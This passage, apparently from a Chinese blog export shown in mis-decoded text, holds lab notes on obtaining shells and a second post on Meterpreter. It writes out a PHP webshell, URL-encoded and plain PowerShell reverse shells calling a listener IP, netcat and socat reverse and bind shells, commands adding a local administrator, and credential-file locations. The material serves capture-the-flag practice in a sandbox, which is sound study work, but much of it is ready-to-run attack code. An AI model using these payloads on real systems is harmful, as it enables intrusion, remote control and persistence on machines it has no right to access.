ä¸­çš„å‚æ•°â€”â€”ç„¶åç”±è„šæœ¬æ‰§è¡Œï¼Œæ‰§è¡Œçš„ç»“æœè¿”å›å¹¶ä¼šå†™å…¥ç½‘ç«™é¡µé¢ã€‚åœ¨å¦ä¸€æ–¹é¢ï¼Œwebshellä¹Ÿèƒ½å¤Ÿä½œä¸ºè¿›å…¥å®Œå…¨æˆç†Ÿçš„åå‘shellæˆ–ç»‘å®šshellçš„å«è„šçŸ³ã€‚ ç”±äº PHP ä»ç„¶æ˜¯æœ€å¸¸è§çš„æœåŠ¡å™¨ç«¯è„šæœ¬è¯­è¨€ï¼Œè®©æˆ‘ä»¬æ¥çœ‹ä¸€äº›ç®€å•çš„PHPä»£ç ï¼Œä»¥ä¸€ç§éå¸¸åŸºç¡€çš„å•è¡Œæ ¼å¼ä¹¦å†™: &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET[\"cmd\"]) . \"&lt;/pre&gt;\"; ?&gt; è¿™å°†åœ¨ URL ä¸­è·å–ä¸€ä¸ª GET å‚æ•°ï¼Œå¹¶ä½¿ç”¨\" shell_exec() \"åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œå®ƒã€‚ è¿™æ„å‘³ç€æˆ‘ä»¬åœ¨URL ä¸­çš„ \" ?cmd= \"ä¹‹åè¾“å…¥çš„ä»»ä½•å‘½ä»¤éƒ½å°†åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œâ€”â€”æ— è®ºæ˜¯ Windows è¿˜æ˜¯ Linuxã€‚ \" pre \"å…ƒç´ æ˜¯ä¸ºäº†ç¡®ä¿æ˜¾ç¤ºåœ¨ç½‘ç«™é¡µé¢ä¸Šçš„ç»“æœçš„æ ¼å¼æ­£ç¡®ã€‚ è®©æˆ‘ä»¬çœ‹çœ‹å®é™…æƒ…å†µ: è¯·æ³¨æ„ï¼Œå½“å¯¼èˆªåˆ°shell.phpé¡µé¢æ—¶ï¼Œæˆ‘ä»¬åœ¨urlä¸­ä½¿ç”¨äº†å¸¦æœ‰\" ifconfig â€œå‘½ä»¤çš„ GET å‚æ•°â€ cmd \"ï¼Œç„¶åæ­£ç¡®åœ°è¿”å›äº†ç›®æ ‡çš„ç½‘ç»œä¿¡æ¯ã€‚ æ¢å¥è¯è¯´ï¼Œé€šè¿‡åœ¨æˆ‘ä»¬ä¸Šä¼ çš„shell.phpé¡µé¢çš„ URL ä¸­è¾“å…¥ ifconfig å‘½ä»¤ï¼ˆè¯¥å‘½ä»¤ç”¨äºæ£€æŸ¥ Linux ç›®æ ‡ä¸Šçš„ç½‘ç»œæ¥å£ï¼‰ï¼Œä½¿å¾—å‘½ä»¤åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œï¼Œå¹¶å°†ç»“æœè¿”å›ç»™æˆ‘ä»¬ã€‚ è¿™é€‚ç”¨äºä»»ä½•å…¶ä»–å‘½ä»¤ï¼ˆä¾‹å¦‚ whoamiã€hostnameã€arch ç­‰ï¼‰ã€‚ å¦‚å‰æ‰€è¿°ï¼Œåœ¨ Kali ä¸Šé»˜è®¤æœ‰å¤šç§ webshell å¯ç”¨ï¼Œä½äº/usr/share/webshellsè·¯å¾„ä¸‹â€”â€”åŒ…æ‹¬è‡­åæ˜­è‘—çš„ PentestMonkey php-reverse-shellâ€”â€”ä¸€ä¸ªç”¨ PHP ç¼–å†™çš„å®Œæ•´çš„åå‘ shellã€‚ è¯·æ³¨æ„ï¼Œå¤§å¤šæ•°é€šç”¨çš„ã€ç‰¹å®šè¯­è¨€çš„ï¼ˆä¾‹å¦‚ PHPï¼‰åå‘ shell æ˜¯ä¸ºåŸºäº Unix çš„ç›®æ ‡ï¼ˆä¾‹å¦‚ Linux ç½‘ç»œæœåŠ¡å™¨ï¼‰ç¼–å†™çš„ï¼Œå®ƒä»¬å¯èƒ½æ— æ³•åœ¨ Windows ä¸Šè¿è¡Œã€‚ PentestMonkeyåå‘shell é“¾æ¥ï¼š https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php å½“ç›®æ ‡æ˜¯ Windows æ—¶ï¼Œé€šå¸¸ä½¿ç”¨ web shell è·å– RCEï¼Œæˆ–è€…ä½¿ç”¨ msfvenom ç”Ÿæˆå¯¹åº”æœåŠ¡å™¨è¯­è¨€çš„åå‘/ç»‘å®š shellã€‚ å‰ä¸€ç§æ–¹æ³•ï¼Œé€šå¸¸æ˜¯ä½¿ç”¨ URL ç¼–ç çš„ Powershell Reverse Shell æ¥è·å– RCEã€‚ è¿™å°†ä½œä¸ºå‰é¢æåˆ°çš„webshellä¸­çš„cmd å‚æ•°å¤åˆ¶åˆ° URL ä¸­ï¼š powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&lt;IP&gt;%27%2C&lt;PORT&gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22 è¿™ä¸æˆ‘ä»¬åœ¨ç¬¬8å°èŠ‚ä¸­é‡åˆ°çš„powershell shell ç›¸åŒï¼Œä½†æ˜¯ï¼Œå®ƒç»è¿‡äº† URL ç¼–ç ï¼Œå¯ä»¥åœ¨ GET å‚æ•°ä¸­å®‰å…¨ä½¿ç”¨ã€‚ è¯·è®°ä½ï¼ŒIP å’Œç«¯å£ï¼ˆä»¥ä¸Šå†…å®¹ä¸­çš„IPã€PORTï¼‰ä»ç„¶éœ€è¦åœ¨ä¸Šé¢çš„ä»£ç ä¸­è¿›è¡Œæ›´æ”¹ã€‚ 0x12 è·å–shellä¹‹åçš„æ“ä½œ å¥½äº†ï¼Œæˆ‘ä»¬æœ‰shelläº†ï¼Œç°åœ¨æ€ä¹ˆåŠï¼Ÿ æˆ‘ä»¬å·²ç»ä»‹ç»äº†è®¸å¤šç”Ÿæˆã€å‘é€å’Œæ¥æ”¶ shell çš„æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•éƒ½æœ‰ä¸€ä¸ªå…±åŒç‚¹ï¼Œé‚£å°±æ˜¯å¾—åˆ°çš„shellå¾€å¾€æ˜¯ä¸ç¨³å®šçš„å’Œéäº¤äº’çš„ã€‚ å³ä½¿æ˜¯æ›´å®¹æ˜“ç¨³å®šåŒ–çš„ Unix é£æ ¼çš„shellçš„ç¨³å®šæ€§ä¹Ÿä¸æ˜¯éå¸¸ç†æƒ³ã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬èƒ½åšäº›ä»€ä¹ˆå‘¢ï¼Ÿ ç†æƒ³æƒ…å†µä¸‹ï¼Œåœ¨ Linux ä¸Šï¼Œæˆ‘ä»¬ä¼šæ¥ç€å¯»æ‰¾æœºä¼šè®¿é—®ç”¨æˆ·å¸æˆ·ï¼Œå­˜å‚¨åœ¨/home/&lt;user&gt;/.sshçš„ SSH å¯†é’¥é€šå¸¸æ˜¯æ‰§è¡Œæ­¤æ“ä½œçš„ç†æƒ³æ–¹å¼ã€‚ åœ¨ CTF ä¸­ï¼Œåœ¨ç›®æ ‡æœºçš„æŸå¤„å‘ç°å¯†ç å‡­è¯ä¹Ÿä¸å°‘è§ï¼Œä¸€äº›æ¼æ´expè¿˜å…è®¸ä½ æ·»åŠ è‡ªå·±çš„å¸æˆ·ï¼Œç‰¹åˆ«æ˜¯åƒ Dirty C0wï¼ˆè„ç‰›æ¼æ´ï¼‰ æˆ–å¯å†™çš„ /etc/shadow æ–‡ä»¶æˆ– /etc/passwdæ–‡ä»¶ä¼šå¾ˆå¿«è®©ä½ é€šè¿‡ SSH æ¥è®¿é—®ç›®æ ‡æœºå™¨ï¼Œå‡è®¾ç›®æ ‡æœºå™¨çš„SSHæœåŠ¡æ˜¯æ‰“å¼€çš„ã€‚ Dirty C0wï¼ˆè„ç‰›æ¼æ´ï¼‰ä»‹ç»ï¼šhttps://dirtycow.ninja/ è€Œåœ¨ Windows ä¸Šï¼Œå¯åˆ©ç”¨çš„é€‰é¡¹é€šå¸¸æ›´åŠ æœ‰é™ï¼Œæœ‰æ—¶å¯ä»¥åœ¨æ³¨å†Œè¡¨ä¸­æ‰¾åˆ°è¿è¡ŒæœåŠ¡çš„å¯†ç ã€‚ä¾‹å¦‚ï¼ŒVNC æœåŠ¡å™¨ç»å¸¸å°†å¯†ç ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­ï¼ŒæŸäº›ç‰ˆæœ¬çš„ FileZilla FTP æœåŠ¡å™¨è¿˜ä¼šåœ¨ XML æ–‡ä»¶ä¸­ä¿ç•™ç™»å½•å‡­æ®ï¼Œå¯èƒ½ä¿ç•™å‡­æ®çš„æ–‡ä»¶è·¯å¾„æ˜¯ï¼š C:\\Program Files\\FileZilla Server\\FileZilla Server.xml #æˆ–è€… C:\\xampp\\FileZilla Server\\FileZilla Server.xml #è¿™äº›å‡­æ®å¯ä»¥æ˜¯MD5æ•£åˆ—å€¼ï¼Œä¹Ÿå¯ä»¥æ˜¯æ˜æ–‡ï¼Œå…·ä½“å–å†³äºç‰ˆæœ¬ ç†æƒ³æƒ…å†µä¸‹ï¼Œåœ¨ Windows ä¸Šï¼Œä½ å°†è·å¾—ä»¥ SYSTEM ç”¨æˆ·èº«ä»½è¿è¡Œçš„ shellï¼Œæˆ–ä»¥é«˜æƒé™è¿è¡Œçš„ç®¡ç†å‘˜å¸æˆ·ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥ç®€å•åœ°å°†ä½ è‡ªå·±çš„å¸æˆ·ï¼ˆåœ¨ç®¡ç†å‘˜ç»„ä¸­ï¼‰æ·»åŠ åˆ°è®¡ç®—æœºï¼Œç„¶åé€šè¿‡ RDPã€telnetã€winexeã€psexecã€WinRM æˆ–å…¶ä»–æ–¹æ³•ç™»å½•ï¼Œå…·ä½“æƒ…å†µå–å†³äºç›®æ ‡æœºå™¨ä¸Šè¿è¡Œçš„æœåŠ¡ã€‚ å…¶åŸºæœ¬è¯­æ³•å¦‚ä¸‹: net user &lt;username&gt; &lt;password&gt; /add #æ·»åŠ æ–°ç”¨æˆ· net localgroup administrators &lt;username&gt; /add #æ·»åŠ ç”¨æˆ·åˆ°ç®¡ç†å‘˜ç»„ åå‘ shell å’Œç»‘å®š shell æ˜¯åœ¨æœºå™¨ä¸Šè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„åŸºæœ¬æŠ€æœ¯ï¼Œä½†æ˜¯ï¼Œå®ƒä»¬æ°¸è¿œä¸ä¼šåƒåŸç”Ÿ shell é‚£æ ·åŠŸèƒ½é½å…¨ã€‚ ç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ€»æ˜¯å¸Œæœ›å‡çº§ä¸ºä½¿ç”¨â€œæ­£å¸¸â€æ–¹æ³•æ¥è®¿é—®æœºå™¨ï¼Œå› ä¸ºè¿™æ€»æ˜¯æ›´å®¹æ˜“ç”¨äºè¿›ä¸€æ­¥åˆ©ç”¨ç›®æ ‡ã€‚ 0x13 ç»ƒä¹ ä¸å®è·µ è¿™ä¸ªç« èŠ‚åŒ…å«äº†å¤§é‡çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å‡ ä¹æ²¡æœ‰æœºä¼šè®©ä½ å§‹ç»ˆå°†å…¶ä»˜è¯¸å®è·µã€‚ æ¥ä¸‹æ¥çš„å®è·µä¸æ¡ˆä¾‹å°†åŒ…å«ä¸¤ä¸ªè™šæ‹Ÿæœºï¼ˆä¸€ä¸ª Ubuntu 18.04 æœåŠ¡å™¨å’Œä¸€ä¸ª Windows æœåŠ¡å™¨ï¼‰ï¼Œæ¯ä¸ªéƒ½é…ç½®æœ‰ä¸€ä¸ªç®€å•çš„ç½‘ç»œæœåŠ¡å™¨ï¼Œè¯·ä½¿ç”¨å®ƒä¸Šä¼ å’Œæ¿€æ´» shellã€‚ åœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­æä¾›çš„æ˜¯ä¸€ä¸ªæ²™ç›’ç¯å¢ƒï¼Œæ‰€ä»¥æ²¡æœ‰è¿‡æ»¤å™¨éœ€è¦è¿›è¡Œç»•è¿‡ï¼Œä½ å¯ä»¥é€‰æ‹©ç™»å½•ä»¥ä½¿ç”¨ netcatã€socat æˆ–meterpreter shell è¿›è¡Œç»ƒä¹ ï¼Œæä¾›ç™»å½•å‡­æ®å’Œè¯´æ˜ï¼ŒåŒæ—¶è¿˜ä¼šç»™å‡ºä¸€äº›shellç¤ºä¾‹ã€‚ Linux Practice Box é™„åŠ åˆ°æ­¤ä»»åŠ¡çš„ç›’å­æ˜¯ä¸€ä¸ª Ubuntu æœåŠ¡å™¨ï¼Œå…¶æ–‡ä»¶ä¸Šä¼ é¡µé¢åœ¨ç½‘ç»œæœåŠ¡å™¨ä¸Šè¿è¡Œã€‚è¿™åº”è¯¥ç”¨äºåœ¨ Linux ç³»ç»Ÿä¸Šç»ƒä¹  shell ä¸Šä¼ ã€‚åŒæ ·ï¼Œæœ¬æœºä¸Šä¹Ÿå®‰è£…äº† socat å’Œ netcatï¼Œå› æ­¤è¯·éšæ„é€šè¿‡ç«¯å£ 22 ä¸Šçš„ SSH ç™»å½•æ¥ç›´æ¥ä½¿ç”¨å®ƒä»¬è¿›è¡Œç»ƒä¹ ã€‚ç™»å½•çš„å‡­æ®æ˜¯ï¼š ç”¨æˆ·åï¼šshell å¯†ç ï¼šTryH4ckM3! ç»ƒä¹ 1 å‡†å¤‡ä¸€ä¸ªwebshell &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET[\"cmd\"]) . \"&lt;/pre&gt;\"; ?&gt; æ¥ç€åœ¨webshellé¡µé¢è¿æ¥æ”»å‡»æœºç›‘å¬ç«¯ ç»ƒä¹ 2 è¿›å…¥shellæ–‡ä»¶ç›®å½•ï¼Œä¿®æ”¹å¯¹åº”IPä¸ç«¯å£ æˆåŠŸæ‹¿shell ç»ƒä¹ 3 sshç™»å½•ç›®æ ‡æœº åœ¨ç›®æ ‡æœºä½¿ç”¨netcatå»ºç«‹ç›‘å¬ç«¯ï¼Œå¹¶åœ¨æ”»å‡»æœºä½¿ç”¨ncè¿æ¥ç›®æ ‡ç«¯å£å³å¯æ‹¿åˆ°ç»‘å®šshell ç¬¬äºŒç§æ–¹æ³•ï¼Œé€‚ç”¨äºlinuxç³»ç»Ÿ mkfifo /tmp/f; nc -lvnp 5555 &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f ä¹Ÿæ˜¯æˆåŠŸæ‹¿åˆ°shellï¼Œæ¥ä¸‹æ¥å°è¯•ç»ƒä¹ åå‘shell mkfifo /tmp/f; nc 10.10.197.61 5555 &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f//ç›®æ ‡æœºä¸Šæ‰§è¡Œ ç»ƒä¹ 4 socat TCP-L:5555 //kaliä¸Šæ‰§è¡Œ socat TCP:10.11.65.203:5555 EXEC:\"bash -li\" //ç›®æ ‡æœºæ‰§è¡Œ å¯ä»¥çœ‹åˆ°å›æ˜¾ä¼šå‡ºç°åœ¨ä¸¤ä¸ªæœºå™¨ä¸Šï¼Œä¸‹é¢æ˜¯ç»‘å®šshell socat TCP-L:5555 EXEC:\"bash -li\" //ç›®æ ‡æœºæ‰§è¡Œ socat TCP:10.10.197.61:5555 - //kaliæ‰§è¡Œ æ¥ä¸‹æ¥å°è¯•å»ºç«‹ä¸€ä¸ªå®Œç¾çš„äº¤äº’å¼shell socat TCP:10.11.65.203:5555 EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane //ç›®æ ‡æœºæ‰§è¡Œ socat TCP-L:5555 FILE:`tty`,raw,echo=0 //kaliæ‰§è¡Œ æ¥ä¸‹æ¥å°è¯•socatçš„åŠ å¯†shell openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt cat shell.key shell.crt &gt; shell.pem socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 - //ä»¥ä¸Šæ˜¯kaliæ‰§è¡Œï¼Œä¸‹é¢æ˜¯ç›®æ ‡æœºæ‰§è¡Œ socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash socat OPENSSL-LISTEN:5555,cert=shell.pem,verify=0 EXEC:/bin/bash //ç›®æ ‡æœºæ‰§è¡Œ socat OPENSSL:10.10.197.61:5555,verify=0 - //kaliæ‰§è¡Œ é¦–å…ˆå¼€å§‹ä¸ªhttpæœåŠ¡ï¼Œä¸Šä¼ å¯¹åº”shell.pemåˆ°ç›®æ ‡æœº ç»ƒä¹ 5 è¿™é‡Œå°è¯•ç›´æ¥ä¸Šä¼ php_reverse_shellï¼Œä½†æ˜¯æ— æ•ˆ è¿™è¯´æ˜è¯¥php_reverse_shellå†…å®¹åªé€‚ç”¨äºunixç³»ç»Ÿ ç»ƒä¹ 6 å°è¯•ä¸Šä¼ webshellï¼Œåˆ©ç”¨shell_execæ‰§è¡Œpowershellåå¼¹shellè„šæœ¬ &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET[\"cmd\"]) . \"&lt;/pre&gt;\"; ?&gt; powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.11.65.203',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" ç»ƒä¹ 7 å¯ä»¥åœ¨ä¸Šé¢ç»ƒä¹ 6çš„åŸºç¡€ä¸Šï¼Œæ·»åŠ ç”¨æˆ·åˆ°ç®¡ç†å‘˜ç»„ï¼Œç›´æ¥è¿œç¨‹ç™»å½• net user &lt;username&gt; &lt;password&gt; /add #æ·»åŠ æ–°ç”¨æˆ· net localgroup administrators &lt;username&gt; /add #æ·»åŠ ç”¨æˆ·åˆ°ç®¡ç†å‘˜ç»„ xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.90.86 /u:hybcx /p:'1234' #æ·»åŠ å‰ªåˆ‡æ¿åŠŸèƒ½ ç»ƒä¹ 8 netcatåå‘shell xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.90.86 /u:Administrator /p:'TryH4ckM3!' netcatç»‘å®šshell socatåå‘shell socat TCP-L:5555 - socat TCP:10.11.65.203:5555 EXEC:powershell.exe,pipes socatç»‘å®šshell socat TCP-L:5555 EXEC:powershell.exe,pipes socat TCP:10.11.65.203:5555 - ç»ƒä¹ 9 ä½¿ç”¨msfvenomç”Ÿæˆexeä¹‹åç›´æ¥å¤åˆ¶åˆ°ç›®æ ‡æœºä¸Šå³å¯ï¼Œæ¥ä¸‹æ¥è¿›å…¥meterpreterçš„ç›‘å¬æ¨¡å— ç»ƒä¹ 10 ä½¿ç”¨ç»ƒä¹ 9é—ç•™çš„åˆ†æ®µexeï¼Œå‘ç°å¼¹å›æ¥çš„shellæ— æ³•ä½¿ç”¨ï¼Œä¸èƒ½å›æ˜¾ä¿¡æ¯ï¼Œæ¥ä¸‹æ¥å°è¯•ä¸åˆ†æ®µçš„ å¦‚ä¸‹å›¾ï¼Œä¾æ—§æ²¡ååº” ç»“æœï¼šä¸èƒ½ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨msfé‡Œé¢çš„multi/handleræ¨¡å—æ•è·meterpreter shellï¼Œç”¨netcatå¹¶ä¸èƒ½ä½¿è¿™ä¸ªshellæ­£å¸¸å·¥ä½œã€‚","tags":["Metasploit"],"categories":["Metasploit"]},{"title":"Metasploitå­¦ä¹ 2","path":"/2024/03/24/metasploit-xue-xi-2/","content":"0x01 ç®€ä»‹ Meterpreter æ˜¯ä¸€ä¸ª Metasploit æœ‰æ•ˆè´Ÿè½½ï¼Œé€šè¿‡è®¸å¤šæœ‰ä»·å€¼çš„ç»„ä»¶æ”¯æŒæ¸—é€æµ‹è¯•è¿‡ç¨‹ã€‚ Meterpreter å°†åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œï¼Œå¹¶å……å½“å‘½ä»¤å’Œæ§åˆ¶æ¶æ„ä¸­çš„ä»£ç†ã€‚æ‚¨å°†ä¸ç›®æ ‡æ“ä½œç³»ç»Ÿå’Œæ–‡ä»¶è¿›è¡Œäº¤äº’ï¼Œå¹¶ä½¿ç”¨ Meterpreter çš„ä¸“ç”¨å‘½ä»¤ã€‚ Meterpreter æœ‰å¾ˆå¤šç‰ˆæœ¬ï¼Œæ ¹æ®ç›®æ ‡ç³»ç»Ÿæä¾›ä¸åŒçš„åŠŸèƒ½ã€‚ Meterpreter æ˜¯å¦‚ä½•å·¥ä½œçš„ Meterpreter åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œï¼Œä½†æœªå®‰è£…ã€‚å®ƒåœ¨å†…å­˜ä¸­è¿è¡Œï¼Œä¸ä¼šå°†è‡ªèº«å†™å…¥ç›®æ ‡ä¸Šçš„ç£ç›˜ã€‚æ­¤åŠŸèƒ½æ—¨åœ¨é¿å…åœ¨é˜²ç—…æ¯’æ‰«ææœŸé—´è¢«æ£€æµ‹åˆ°ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå¤§å¤šæ•°é˜²ç—…æ¯’è½¯ä»¶å°†æ‰«æç£ç›˜ä¸Šçš„æ–°æ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼Œå½“æ‚¨ä»äº’è”ç½‘ä¸‹è½½æ–‡ä»¶æ—¶ï¼‰Meterpreter åœ¨å†…å­˜ï¼ˆRAM - éšæœºå­˜å–å­˜å‚¨å™¨ï¼‰ä¸­è¿è¡Œï¼Œä»¥é¿å…å°†æ–‡ä»¶å†™å…¥åˆ°ç£ç›˜ä¸Šç›®æ ‡ç³»ç»Ÿï¼ˆä¾‹å¦‚ meterpreter.exeï¼‰ã€‚è¿™æ ·ï¼ŒMeterpreter å°†è¢«è§†ä¸ºä¸€ä¸ªè¿›ç¨‹ï¼Œå¹¶ä¸”åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ²¡æœ‰æ–‡ä»¶ã€‚ Meterpreter è¿˜æ—¨åœ¨é€šè¿‡ä¸è¿è¡Œ Metasploit çš„æœåŠ¡å™¨ï¼ˆé€šå¸¸æ˜¯æ‚¨çš„æ”»å‡»æœºå™¨ï¼‰è¿›è¡ŒåŠ å¯†é€šä¿¡ï¼Œé¿å…è¢«åŸºäºç½‘ç»œçš„ IPSï¼ˆå…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼‰å’Œ IDSï¼ˆå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼‰è§£å†³æ–¹æ¡ˆæ£€æµ‹åˆ°ã€‚å¦‚æœç›®æ ‡ç»„ç»‡ä¸è§£å¯†å’Œæ£€æŸ¥è¿›å‡ºæœ¬åœ°ç½‘ç»œçš„åŠ å¯†æµé‡ï¼ˆä¾‹å¦‚ HTTPSï¼‰ï¼ŒIPS å’Œ IDS è§£å†³æ–¹æ¡ˆå°†æ— æ³•æ£€æµ‹å…¶æ´»åŠ¨ã€‚ è™½ç„¶ Meterpreter è¢«ä¸»è¦é˜²ç—…æ¯’è½¯ä»¶è¯†åˆ«ï¼Œä½†æ­¤åŠŸèƒ½æä¾›äº†ä¸€å®šç¨‹åº¦çš„éšè”½æ€§ã€‚ ä¸‹é¢çš„ç¤ºä¾‹æ˜¾ç¤ºäº†ä½¿ç”¨ MS17-010 æ¼æ´åˆ©ç”¨çš„ç›®æ ‡ Windows è®¡ç®—æœºã€‚æ‚¨å°†çœ‹åˆ° Meterpreter æ­£åœ¨è¿è¡Œï¼Œè¿›ç¨‹ ID (PID) ä¸º 1304ï¼›è¿™ä¸ª PID åœ¨ä½ çš„æƒ…å†µä¸‹ä¼šæœ‰æ‰€ä¸åŒã€‚æˆ‘ä»¬ä½¿ç”¨äº† getpid å‘½ä»¤ï¼Œå®ƒè¿”å›è¿è¡Œ Meterpreter çš„è¿›ç¨‹ IDã€‚æ“ä½œç³»ç»Ÿä½¿ç”¨è¿›ç¨‹ IDï¼ˆæˆ–è¿›ç¨‹æ ‡è¯†ç¬¦ï¼‰æ¥è¯†åˆ«æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚æ‰€æœ‰åœ¨Linuxæˆ–Windowsä¸­è¿è¡Œçš„è¿›ç¨‹éƒ½ä¼šæœ‰ä¸€ä¸ªå”¯ä¸€çš„IDå·ï¼›è¯¥æ•°å­—ç”¨äºåœ¨éœ€è¦æ—¶ï¼ˆä¾‹å¦‚ï¼Œå¦‚æœéœ€è¦åœæ­¢ï¼‰ä¸è¿›ç¨‹è¿›è¡Œäº¤äº’ã€‚ meterpreter &gt; getpid Current pid: 1304 å¦‚æœæˆ‘ä»¬ä½¿ç”¨ ps å‘½ä»¤åˆ—å‡ºç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œçš„è¿›ç¨‹ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ° PID 1304 æ˜¯ spoolsv.exe è€Œä¸æ˜¯ Meterpreter.exeï¼Œæ­£å¦‚äººä»¬æ‰€æœŸæœ›çš„é‚£æ ·ã€‚ meterpreter &gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x64 0 396 644 LogonUI.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\LogonUI.exe 416 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM \\SystemRoot\\System32\\smss.exe 428 692 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 548 540 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\csrss.exe 596 540 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\wininit.exe 604 588 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\csrss.exe 644 588 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\winlogon.exe 692 596 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\services.exe 700 692 sppsvc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 716 596 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\lsass.exe 1276 1304 cmd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\cmd.exe 1304 692 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe 1340 692 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 1388 548 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\conhost.exe å³ä½¿æˆ‘ä»¬æ›´è¿›ä¸€æ­¥ï¼ŒæŸ¥çœ‹ Meterpreter è¿›ç¨‹ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸º PID 1304ï¼‰ä½¿ç”¨çš„ DLLï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰ï¼Œæˆ‘ä»¬ä»ç„¶ä¸ä¼šå‘ç°ä»»ä½•ä¸œè¥¿ï¼ˆä¾‹å¦‚ï¼Œæ²¡æœ‰meterpreter.dllï¼‰ C:\\Windows\\system32&gt;tasklist /m /fi \"pid eq 1304\" tasklist /m /fi \"pid eq 1304\" Image Name PID Modules ========================= ======== ============================================ spoolsv.exe 1304 ntdll.dll, kernel32.dll, KERNELBASE.dll, msvcrt.dll, sechost.dll, RPCRT4.dll, USER32.dll, GDI32.dll, LPK.dll, USP10.dll, POWRPROF.dll, SETUPAPI.dll, CFGMGR32.dll, ADVAPI32.dll, OLEAUT32.dll, ole32.dll, DEVOBJ.dll, DNSAPI.dll, WS2_32.dll, NSI.dll, IMM32.DLL, MSCTF.dll, CRYPTBASE.dll, slc.dll, RpcRtRemote.dll, secur32.dll, SSPICLI.DLL, credssp.dll, IPHLPAPI.DLL, WINNSI.DLL, mswsock.dll, wshtcpip.dll, wship6.dll, rasadhlp.dll, fwpuclnt.dll, CLBCatQ.DLL, umb.dll, ATL.DLL, WINTRUST.dll, CRYPT32.dll, MSASN1.dll, localspl.dll, SPOOLSS.DLL, srvcli.dll, winspool.drv, PrintIsolationProxy.dll, FXSMON.DLL, tcpmon.dll, snmpapi.dll, wsnmp32.dll, msxml6.dll, SHLWAPI.dll, usbmon.dll, wls0wndh.dll, WSDMon.dll, wsdapi.dll, webservices.dll, FirewallAPI.dll, VERSION.dll, FunDisc.dll, fdPnp.dll, winprint.dll, USERENV.dll, profapi.dll, GPAPI.dll, dsrole.dll, win32spl.dll, inetpp.dll, 